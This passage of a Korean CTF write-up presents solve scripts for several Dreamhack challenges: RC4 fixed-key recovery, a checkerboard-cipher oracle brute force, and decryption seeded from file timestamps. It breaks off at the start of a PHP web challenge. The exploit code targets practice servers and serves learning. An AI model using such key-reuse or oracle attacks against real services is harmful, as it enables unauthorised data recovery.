+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> x<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (step[x][z] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(calct(lastx <span style="color:#f92672">-</span> x, lastz <span style="color:#f92672">-</span> z))
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>z<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                lastx <span style="color:#f92672">=</span> x
+</span></span><span style="display:flex;"><span>                lastz <span style="color:#f92672">=</span> z
+</span></span><span style="display:flex;"><span>                print(p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">19</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (step[x][z] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(calct(lastx <span style="color:#f92672">-</span> x, lastz <span style="color:#f92672">-</span> z))
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>z<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                lastx <span style="color:#f92672">=</span> x
+</span></span><span style="display:flex;"><span>                lastz <span style="color:#f92672">=</span> z
+</span></span><span style="display:flex;"><span>                print(p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="n-private-storage">N. Private Storage<a hidden class="anchor" aria-hidden="true" href="#n-private-storage">#</a></h2>
+<h3 id="vulnerability-5">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-5">#</a></h3>
+<p>RC4의 작동 방식은 <code>Ct = Pt ⊕ Key</code>와 같은 간단한 방식이다.
+_server.py_를 보면 <code>key</code>가 고정되어 있으므로 다음과 같이 flag를 구할 수 있다.</p>
+<pre tabindex="0"><code>C_str = P_str ⊕ Key
+C_flag = P_flag ⊕ Key
+P_flag = C_flag ⊕ C_str ⊕ P_str
+</code></pre><h3 id="exploit-5">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-5">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode, b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process([&#34;python3&#34;, &#34;server.py&#34;])</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host1.dreamhack.games&#34;</span>, <span style="color:#ae81ff">23936</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download_file</span>(fname):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, fname<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b64decode(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_file</span>(fname, content):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, fname<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> download_file(<span style="color:#e6db74">&#34;key&#34;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> download_file(<span style="color:#e6db74">&#34;flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;12345678&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_file(<span style="color:#e6db74">&#34;a&#34;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> download_file(<span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>xor_bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a, b: bytes([q<span style="color:#f92672">^</span>w <span style="color:#66d9ef">for</span> q, w <span style="color:#f92672">in</span> zip(a, b)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>zlib_flag <span style="color:#f92672">=</span> xor_bytes(xor_bytes(flag, b), zlib<span style="color:#f92672">.</span>compress(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(zlib_flag)
+</span></span><span style="display:flex;"><span>print(zlib<span style="color:#f92672">.</span>decompress(zlib_flag))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="o-checkers">O. Checkers<a hidden class="anchor" aria-hidden="true" href="#o-checkers">#</a></h2>
+<h3 id="vulnerability-6">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-6">#</a></h3>
+<p>문제 파일에 있는 함수 이름 <code>straddling_checkerboard</code>를 검색해보니 치환 암호라는 것을 알 수 있었다.</p>
+<p>한 글자씩 추가해가며 flag의 암호화 결과와 일치하는 것을 찾아 flag를 구할 수 있었다.</p>
+<h3 id="exploit-6">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-6">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ_/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process([&#34;python3&#34;, &#34;chal.py&#34;])</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host3.dreamhack.games&#34;</span>, <span style="color:#ae81ff">9090</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">4</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, data<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#34;</span>]
+</span></span><span style="display:flex;"><span>flag_maybe <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> result:
+</span></span><span style="display:flex;"><span>    now <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(now) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>:
+</span></span><span style="display:flex;"><span>        print(now)
+</span></span><span style="display:flex;"><span>        flag_maybe<span style="color:#f92672">.</span>append(now)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> ch:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> flag<span style="color:#f92672">.</span>find(enc(now <span style="color:#f92672">+</span> c)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">.</span>append(now <span style="color:#f92672">+</span> c)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(flag_maybe)
+</span></span></code></pre></div><hr>
+<h2 id="p-farmer">P. farmer<a hidden class="anchor" aria-hidden="true" href="#p-farmer">#</a></h2>
+<p>FTK Imager를 사용해 _/home/ubuntu_아래에서 _binary_와 <em>flag.png.00</em> ~ _flag.png.09_를 얻을 수 있었다.</p>
+<p>문제의 힌트를 보면 _flag.png_파일을 10개의 chunk로 나누어 어떤 처리를 했다는 것을 유추할 수 있고, 각 chunk를 _binary_의 입력으로 사용했다고 생각해볼 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;flag.png&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>)
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>filesize <span style="color:#f92672">=</span> len(data)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range((filesize <span style="color:#f92672">//</span> <span style="color:#ae81ff">1000</span>) <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0</span> <span style="color:#66d9ef">if</span> (filesize<span style="color:#f92672">%</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">1</span>)):
+</span></span><span style="display:flex;"><span>    frag <span style="color:#f92672">=</span> data[i<span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>]
+</span></span></code></pre></div><pre tabindex="0"><code>$ stat flag.png
+  File: flag.png
+  Size: 9519            Blocks: 24         IO Block: 4096
+...
+</code></pre><p>_binary_를 살펴보면 현재 시간을 seed로 사용하여 랜덤한 값을 암호화에 사용하고 있다.
+_flag.png.XX_의 timestamp 정보를 알 수 있으므로 <code>rand()</code>에서 어떤 값이 나올지 모두 알 수 있고, 이를 역연산하는 코드를 작성하여 flag를 얻을 수 있었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>srand(time(<span style="color:#ae81ff">0LL</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">make_rand_buf</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>    rand_buf[i] <span style="color:#f92672">=</span> rand();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">action1_func</span>() {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    range <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> (<span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> j);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">action1_func</span>() {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    range <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> j);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="solution-3">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-3">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_pbox</span>(n):
+</span></span><span style="display:flex;"><span>    pbox <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span>n
+</span></span><span style="display:flex;"><span>    list1 <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(n)]
+</span></span><span style="display:flex;"><span>    list2 <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> (n<span style="color:#f92672">-</span>i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(r):
+</span></span><span style="display:flex;"><span>            list2<span style="color:#f92672">.</span>append(list1<span style="color:#f92672">.</span>pop())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        pbox[i] <span style="color:#f92672">=</span> list1<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(r):
+</span></span><span style="display:flex;"><span>            list1<span style="color:#f92672">.</span>append(list2<span style="color:#f92672">.</span>pop())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pbox
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(data, randbuf):
+</span></span><span style="display:flex;"><span>    history <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>        action <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>: <span style="color:#75715e"># xor</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>                 data[j] <span style="color:#f92672">^=</span> randbuf[j <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            history<span style="color:#f92672">.</span>append((<span style="color:#ae81ff">2</span>, <span style="color:#66d9ef">None</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            pbox <span style="color:#f92672">=</span> make_pbox(<span style="color:#ae81ff">256</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>                data[j] <span style="color:#f92672">=</span> pbox[data[j]]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            history<span style="color:#f92672">.</span>append((<span style="color:#ae81ff">0</span>, pbox))
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            pbox <span style="color:#f92672">=</span> make_pbox(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                tmp <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                    tmp[pbox[k]] <span style="color:#f92672">=</span> data[j <span style="color:#f92672">+</span> k]
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                    data[j <span style="color:#f92672">+</span> k] <span style="color:#f92672">=</span> tmp[k]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            history<span style="color:#f92672">.</span>append((<span style="color:#ae81ff">1</span>, pbox))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data, history
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>(data, history, randbuf):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span>):
+</span></span><span style="display:flex;"><span>        action, pbox <span style="color:#f92672">=</span> history<span style="color:#f92672">.</span>pop()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>: <span style="color:#75715e"># xor</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>                 data[j] <span style="color:#f92672">^=</span> randbuf[j <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>                data[j] <span style="color:#f92672">=</span> pbox<span style="color:#f92672">.</span>index(data[j])
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                tmp <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                    tmp[k] <span style="color:#f92672">=</span> data[j <span style="color:#f92672">+</span> k]
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>                    data[j <span style="color:#f92672">+</span> k] <span style="color:#f92672">=</span> tmp[pbox[k]]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#dec(&#34;out/flag.png.00&#34;, filetimes[0])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> bytearray()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filetimes <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1661114954</span>, <span style="color:#ae81ff">1661114956</span>, <span style="color:#ae81ff">1661114964</span>, <span style="color:#ae81ff">1661114970</span>, <span style="color:#ae81ff">1661114975</span>, <span style="color:#ae81ff">1661114982</span>, <span style="color:#ae81ff">1661114992</span>, <span style="color:#ae81ff">1661114995</span>, <span style="color:#ae81ff">1661115002</span>, <span style="color:#ae81ff">1661115005</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>srand(filetimes[i])
+</span></span><span style="display:flex;"><span>    randbuf <span style="color:#f92672">=</span> [libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> bytearray(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;testqwerasdfzxcv&#34;</span>)
+</span></span><span style="display:flex;"><span>    enc_test, history <span style="color:#f92672">=</span> enc(data, randbuf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    dec_test = dec(enc_test, history, randbuf)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    assert dec_test == data</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;out/flag.png.</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">:</span><span style="color:#e6db74">02d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> bytearray(f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">+=</span> dec(data, history, randbuf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bytes([i]<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">in</span> result[<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>:]:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> result[:<span style="color:#f92672">-</span>i]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag.png&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(result)
+</span></span></code></pre></div><hr>
+<h2 id="q-api-portal">Q. API Portal<a hidden class="anchor" aria-hidden="true" href="#q-api-portal">#</a></h2>
+<h3 id="vulnerability-7">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-7">#</a></h3>
+<p>_action/flag/flag.php_를 보면 localhost에서 접속하고, post data로 mode, dbkey, key를 넘겨주면 flag를 파일에 출력해주는 것을 알 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
